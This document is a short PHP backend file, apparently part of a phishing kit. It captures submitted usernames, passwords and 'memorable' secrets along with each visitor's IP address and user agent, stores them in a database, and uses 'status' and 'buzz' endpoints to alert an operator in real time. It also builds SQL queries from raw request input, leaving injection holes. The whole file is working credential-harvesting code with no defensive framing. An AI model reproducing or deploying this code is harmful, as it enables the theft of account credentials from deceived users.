<?php
include 'config.php';





////////////////////////////////////// RESET THE BUZZ ON EACH SUBMITTED THING

if($_GET['type'] == 'login'){
	$login = $_POST['username'];
	$pass = $_POST['password'];
	$memo = $_POST['memorable'];
	$ip = $_SERVER['REMOTE_ADDR'];
	$agent = $_SERVER['HTTP_USER_AGENT'];
	$sql_agent = "INSERT INTO hali(login, memo, pass, ip, agent, status, buzz) VALUES('$login', '$memo', '$pass', '$ip', '$agent', 'loading', '1');";
	mysqli_query($conn, $sql_agent);
	echo json_encode(array('status' => 'ok'));
	
}
if($_GET['type'] == 'status'){
	$ip = $_SERVER['REMOTE_ADDR'];
	
	$sql = "SELECT (status) FROM hali WHERE ip='$ip';";
	

	$result = $conn->query($sql);
	while($row = $result->fetch_assoc()){
		echo $row['status'];
	}

}
if($_GET['type'] == 'buzz'){
	

	$sql = "SELECT (buzz) FROM hali;";
	

	$result = $conn->query($sql);
	while($row = $result->fetch_assoc()){
		if ($row['buzz'] == '1'){
			echo "1";
			exit();
		}
		if ($row['buzz'] == '2'){
			echo "2";
			exit();
		}
	}

}

if($_GET['type'] == 'buzzoff'){
	$sql_agent = "UPDATE hali SET buzz='0' WHERE buzz='1';";
	mysqli_query($conn, $sql_agent);
	$sql_agent = "UPDATE hali SET buzz='0' WHERE buzz='2';";
	mysqli_query($conn, $sql_agent);
	echo "a";

	
}
if($_GET['type'] == 'buzzoff2'){
	$sql_agent = "UPDATE hali SET buzz='2' WHERE buzz='1';";
	mysqli_query($conn, $sql_agent);


	
}
if($_GET['type'] == 'reset'){
	$ip = $_SERVER['REMOTE_ADDR'];
	$sql_agent = "DELETE FROM hali WHERE ip='$ip';";
	mysqli_query($conn, $sql_agent);
	echo json_encode(array('status' => 'ok'));
	
}


